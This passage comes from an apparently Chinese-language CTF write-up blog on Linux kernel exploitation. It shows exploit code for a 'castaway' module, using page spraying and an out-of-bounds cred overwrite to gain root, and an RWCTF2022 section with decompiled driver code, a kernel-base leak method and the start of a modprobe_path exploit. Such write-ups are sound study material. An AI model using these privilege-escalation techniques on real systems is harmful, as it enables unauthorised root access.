req.tp_frame_size;</span><br><span class="line"></span><br><span class="line">    ret = setsockopt(socket_fd, SOL_PACKET, PACKET_TX_RING, &amp;req, <span class="keyword">sizeof</span>(req));</span><br><span class="line">    <span class="keyword">if</span> (ret &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[x] failed at setsockopt(PACKET_TX_RING)\n&quot;</span>);</span><br><span class="line">        <span class="keyword">goto</span> err_setsockopt;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> socket_fd;</span><br><span class="line"></span><br><span class="line">    err_setsockopt:</span><br><span class="line">    close(socket_fd);</span><br><span class="line">    err_out:</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* the parent process should call it to send command of allocation to child */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">alloc_page</span><span class="params">(<span class="type">int</span> idx, <span class="type">unsigned</span> <span class="type">int</span> size, <span class="type">unsigned</span> <span class="type">int</span> nr)</span> &#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pgv_page_request</span> <span class="title">req</span> =</span> &#123;</span><br><span class="line">            .idx = idx,</span><br><span class="line">            .cmd = CMD_ALLOC_PAGE,</span><br><span class="line">            .size = size,</span><br><span class="line">            .nr = nr,</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="type">int</span> ret;</span><br><span class="line"></span><br><span class="line">    write(cmd_pipe_req[<span class="number">1</span>], &amp;req, <span class="keyword">sizeof</span>(<span class="keyword">struct</span> pgv_page_request));</span><br><span class="line">    read(cmd_pipe_reply[<span class="number">0</span>], &amp;ret, <span class="keyword">sizeof</span>(ret));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* the parent process should call it to send command of freeing to child */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">free_page</span><span class="params">(<span class="type">int</span> idx)</span> &#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pgv_page_request</span> <span class="title">req</span> =</span> &#123;</span><br><span class="line">            .idx = idx,</span><br><span class="line">            .cmd = CMD_FREE_PAGE,</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="type">int</span> ret;</span><br><span class="line"></span><br><span class="line">    write(cmd_pipe_req[<span class="number">1</span>], &amp;req, <span class="keyword">sizeof</span>(req));</span><br><span class="line">    read(cmd_pipe_reply[<span class="number">0</span>], &amp;ret, <span class="keyword">sizeof</span>(ret));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* the child, handler for commands from the pipe */</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">spray_cmd_handler</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pgv_page_request</span> <span class="title">req</span>;</span></span><br><span class="line">    <span class="type">int</span> socket_fd[PGV_PAGE_NUM];</span><br><span class="line">    <span class="type">int</span> ret;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* create an isolate namespace*/</span></span><br><span class="line">    unshare_setup();</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* handler request */</span></span><br><span class="line">    <span class="keyword">do</span> &#123;</span><br><span class="line">        read(cmd_pipe_req[<span class="number">0</span>], &amp;req, <span class="keyword">sizeof</span>(req));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (req.cmd == CMD_ALLOC_PAGE) &#123;</span><br><span class="line">            ret = create_socket_and_alloc_pages(req.size, req.nr);</span><br><span class="line">            socket_fd[req.idx] = ret;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (req.cmd == CMD_FREE_PAGE) &#123;</span><br><span class="line">            ret = close(socket_fd[req.idx]);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[x] invalid request: %d\n&quot;</span>, req.cmd);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        write(cmd_pipe_reply[<span class="number">1</span>], &amp;ret, <span class="keyword">sizeof</span>(ret));</span><br><span class="line">    &#125; <span class="keyword">while</span> (req.cmd != CMD_EXIT);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* init pgv-exploit subsystem :) */</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">prepare_pgv_system</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">    <span class="comment">/* pipe for pgv */</span></span><br><span class="line">    pipe(cmd_pipe_req);</span><br><span class="line">    pipe(cmd_pipe_reply);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* child process for pages spray */</span></span><br><span class="line">    <span class="keyword">if</span> (!fork()) &#123;</span><br><span class="line">        spray_cmd_handler();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">bind_core</span><span class="params">(<span class="type">int</span> core)</span> &#123;</span><br><span class="line">    <span class="type">cpu_set_t</span> cpu_set;</span><br><span class="line"></span><br><span class="line">    CPU_ZERO(&amp;cpu_set);</span><br><span class="line">    CPU_SET(core, &amp;cpu_set);</span><br><span class="line">    sched_setaffinity(getpid(), <span class="keyword">sizeof</span>(cpu_set), &amp;cpu_set);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">0x1000</span>];</span><br><span class="line"></span><br><span class="line">    bind_core(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    dev_fd = open(<span class="string">&quot;/dev/castaway&quot;</span>, O_RDWR);</span><br><span class="line">    <span class="keyword">if</span> (dev_fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        err_exit(<span class="string">&quot;FAILED to open castaway device!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    prepare_pgv_system();</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* make buddy&#x27;s lower order clean, castaway_requesting from higher */</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] spraying pgv pages...&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PGV_PAGE_NUM; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (alloc_page(i, getpagesize(), <span class="number">1</span>) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[x] failed at no.%d socket\n&quot;</span>, i);</span><br><span class="line">            err_exit(<span class="string">&quot;FAILED to spray pages via socket!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* free pages for cred */</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] freeing for cred pages...&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt; PGV_PAGE_NUM; i += <span class="number">2</span>) &#123;</span><br><span class="line">        free_page(i);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* spray cred to get the isolate pages we released before */</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] spraying cred...&quot;</span>);</span><br><span class="line">    pipe(check_root_pipe);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; CRED_SPRAY_NUM; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (simple_clone(CLONE_FILES | CLONE_FS | CLONE_VM | CLONE_SIGHAND, waiting_for_root_fn) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[x] failed at cloning %d child\n&quot;</span>, i);</span><br><span class="line">            err_exit(<span class="string">&quot;FAILED to clone()!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* free pages for our vulerable objects */</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] freeing for vulnerable pages...&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PGV_PAGE_NUM; i += <span class="number">2</span>) &#123;</span><br><span class="line">        free_page(i);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* spray vulnerable objects, hope that we can make an oob-write to cred */</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] trigerring vulnerability in castaway kernel module...&quot;</span>);</span><br><span class="line">    <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">    *(<span class="type">uint32_t</span> *) &amp;buf[VUL_OBJ_SIZE - <span class="number">6</span>] = <span class="number">1</span>;    <span class="comment">/* cred-&gt;usage */</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; VUL_OBJ_NUM; i++) &#123;</span><br><span class="line">        alloc();</span><br><span class="line">        edit(i, VUL_OBJ_SIZE, buf);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* checking privilege in child processes */</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] notifying child processes and waiting...&quot;</span>);</span><br><span class="line">    write(check_root_pipe[<span class="number">1</span>], buf, CRED_SPRAY_NUM);</span><br><span class="line"></span><br><span class="line">    sleep(<span class="number">100000000</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h2 id="D-3CTF2023-d3kcache"><a href="#D-3CTF2023-d3kcache" class="headerlink" title="D^3CTF2023 d3kcache"></a>D^3CTF2023 d3kcache</h2><h3 id="题目分析-6"><a href="#题目分析-6" class="headerlink" title="题目分析"></a>题目分析</h3><h3 id="利用思路-26"><a href="#利用思路-26" class="headerlink" title="利用思路"></a>利用思路</h3><h3 id="exp-26"><a href="#exp-26" class="headerlink" title="exp"></a>exp</h3><h2 id="RWCTF2022-Digging-into-kernel-1-2"><a href="#RWCTF2022-Digging-into-kernel-1-2" class="headerlink" title="RWCTF2022 Digging into kernel 1 &amp; 2"></a>RWCTF2022 Digging into kernel 1 &amp; 2</h2><h3 id="题目分析-7"><a href="#题目分析-7" class="headerlink" title="题目分析"></a>题目分析</h3><p><strong>start.sh</strong></p>
<div class="code-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"></span><br><span class="line">qemu-system-x86_64 \</span><br><span class="line">    -kernel bzImage \</span><br><span class="line">    -initrd rootfs.img \</span><br><span class="line">    -append <span class="string">&quot;console=ttyS0 root=/dev/ram rdinit=/sbin/init quiet noapic kalsr&quot;</span> \</span><br><span class="line">    -cpu kvm64,+smep,+smap \</span><br><span class="line">    -monitor null \</span><br><span class="line">    --nographic \</span><br><span class="line">    -s</span><br></pre></td></tr></table></figure></div>

<p><strong>逆向分析</strong></p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">xkmod_init</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  kmem_cache *v0; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  printk(&amp;unk_1E4);</span><br><span class="line">  misc_register(&amp;xkmod_device);</span><br><span class="line">  v0 = (kmem_cache *)kmem_cache_create(<span class="string">&quot;lalala&quot;</span>, <span class="number">192LL</span>, <span class="number">0LL</span>, <span class="number">0LL</span>, <span class="number">0LL</span>);</span><br><span class="line">  buf = <span class="number">0LL</span>;</span><br><span class="line">  s = v0;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">xkmod_release</span><span class="params">(inode *inode, file *file)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> kmem_cache_free(s, buf); <span class="comment">// maybe double free</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall <span class="title function_">xkmod_ioctl</span><span class="params">(__int64 a1, <span class="type">int</span> a2, __int64 a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 data; <span class="comment">// [rsp+0h] [rbp-20h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> idx; <span class="comment">// [rsp+8h] [rbp-18h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> size; <span class="comment">// [rsp+Ch] [rbp-14h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v6; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">                                                <span class="comment">// v3 __ : 0x8 rsp + 0x0</span></span><br><span class="line">                                                <span class="comment">// v4 __ : 0x4 rsp + 0x8</span></span><br><span class="line">                                                <span class="comment">// v5 __ : 0x4 rsp + 0xc</span></span><br><span class="line">  v6 = __readgsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( a3 )</span><br><span class="line">  &#123;</span><br><span class="line">    copy_from_user(&amp;data, a3, <span class="number">0x10</span>LL);</span><br><span class="line">    <span class="keyword">if</span> ( a2 == <span class="number">0x6666666</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( buf &amp;&amp; size &lt;= <span class="number">0x50</span> &amp;&amp; idx &lt;= <span class="number">0x70</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        copy_from_user((<span class="type">char</span> *)buf + (<span class="type">int</span>)idx, data, (<span class="type">int</span>)size);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( a2 != <span class="number">0x7777777</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( a2 == <span class="number">0x1111111</span> )</span><br><span class="line">          buf = (<span class="type">void</span> *)kmem_cache_alloc(s, <span class="number">0xCC0</span>LL);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( buf &amp;&amp; size &lt;= <span class="number">0x50</span> &amp;&amp; idx &lt;= <span class="number">0x70</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        ((<span class="type">void</span> (__fastcall *)(__int64, <span class="type">char</span> *, <span class="type">int</span>))copy_to_user)(data, (<span class="type">char</span> *)buf + (<span class="type">int</span>)idx, size);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    xkmod_ioctl_cold();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h3 id="利用思路-27"><a href="#利用思路-27" class="headerlink" title="利用思路"></a>利用思路</h3><p>关于内核基址获取，在内核堆基址（<code>page_offset_base</code>） + 0x9d000 处存放着 <code>secondary_startup_64</code> 函数的地址，而我们可以从 <code>free object</code> 的 <code>next</code> 指针获得一个堆上地址，从而去找堆的基址，之后分配到一个<code>堆基址 + 0x9d000</code> 处的 <code>object</code> 以泄露内核基址，这个地址前面刚好有一片为 NULL 的区域方便我们分配。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> __PAGE_OFFSET           page_offset_base</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PAGE_OFFSET		((unsigned long)__PAGE_OFFSET)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __va(x)			((void *)((unsigned long)(x)+PAGE_OFFSET))</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Must be perfomed *after* relocation. */</span></span><br><span class="line">	trampoline_header = (<span class="keyword">struct</span> trampoline_header *)</span><br><span class="line">		__va(real_mode_header-&gt;trampoline_header);</span><br><span class="line">	...</span><br><span class="line">	trampoline_header-&gt;start = (u64) secondary_startup_64;</span><br><span class="line">[......]</span><br><span class="line"><span class="comment">// vmlinux 查找 secondary_startup_64 基址</span></span><br><span class="line">.text:FFFFFFFF81000030 ; <span class="type">void</span> <span class="title function_">secondary_startup_64</span><span class="params">()</span></span><br><span class="line">[......]</span><br><span class="line">pwndbg&gt;x/40<span class="title function_">gx</span> <span class="params">(<span class="number">0xffff9f5d40000000</span>+<span class="number">0x9d000</span><span class="number">-0x20</span></span></span><br><span class="line"><span class="params"><span class="number">0xffff9f5d4009cfe0</span>: <span class="number">0X0000000000000000</span> <span class="number">0X0000000000000000</span></span></span><br><span class="line"><span class="params"><span class="number">0xffff9f5d4009cff0</span>: <span class="number">0X0000000000000000</span> <span class="number">0X0000000005c0c067</span></span></span><br><span class="line"><span class="params"><span class="number">0xffff9f5d4009d000</span>: <span class="number">0xffffffff97c00030</span> <span class="number">0X0000000000000901</span></span></span><br><span class="line"><span class="params"><span class="number">0xffff9f5d4009d010</span>: <span class="number">0X00000000000006b0</span> <span class="number">0X0000000000000000</span></span></span><br><span class="line"><span class="params"><span class="number">0xffff9f5d4009d020</span>: <span class="number">0X0000000000000000</span> <span class="number">0X0000000000000000</span></span></span><br></pre></td></tr></table></figure></div>

<p>至于 <code>page_offset_base</code> 可以通过 <code>object</code> 上的 <code>free list</code> 泄露的堆地址与上 <code>0xFFFFFFFFF0000000</code> 获取。不同版本可查看<code>vmmap</code>。</p>
<h3 id="exp-27"><a href="#exp-27" class="headerlink" title="exp"></a>exp</h3><div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifndef</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;asm/ldt.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ctype.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/keyctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/userfaultfd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;poll.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;semaphore.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdbool.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ipc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/msg.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/sem.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/shm.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/xattr.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/io.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> modprobe_path = <span class="number">0xFFFFFFFF82444700</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">qword_dump</span><span class="params">(<span class="type">char</span> *desc, <span class="type">void</span> *addr, <span class="type">int</span> len)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">uint64_t</span> *buf64 = (<span class="type">uint64_t</span> *) addr;</span><br><span class="line">    <span class="type">uint8_t</span> *buf8 = (<span class="type">uint8_t</span> *) addr;</span><br><span class="line">    <span class="keyword">if</span> (desc != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[*] %s:\n&quot;</span>, desc);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; len / <span class="number">8</span>; i += <span class="number">4</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;  %04x&quot;</span>, i * <span class="number">8</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">4</span>; j++) &#123;</span><br><span class="line">            i + j &lt; len / <span class="number">8</span> ? <span class="built_in">printf</span>(<span class="string">&quot; 0x%016lx&quot;</span>, buf64[i + j]) : <span class="built_in">printf</span>(<span class="string">&quot;                   &quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;   &quot;</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">32</span> &amp;&amp; j + i * <span class="number">8</span> &lt; len; j++) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, <span class="built_in">isprint</span>(buf8[i * <span class="number">8</span> + j]) ? buf8[i * <span class="number">8</span> + j] : <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Data</span> &#123;</span></span><br><span class="line">    <span class="type">size_t</span> *buf;</span><br><span class="line">    <span class="type">u_int32_t</span> offset;</span><br><span class="line">    <span class="type">u_int32_t</span> size;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">alloc_buf</span><span class="params">(<span class="type">int</span> fd, <span class="keyword">struct</span> Data *data)</span></span><br><span class="line">&#123;</span><br><span class="line">    ioctl(fd, <span class="number">0x1111111</span>, data);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">write_buf</span><span class="params">(<span class="type">int</span> fd, <span class="keyword">struct</span> Data *data)</span></span><br><span 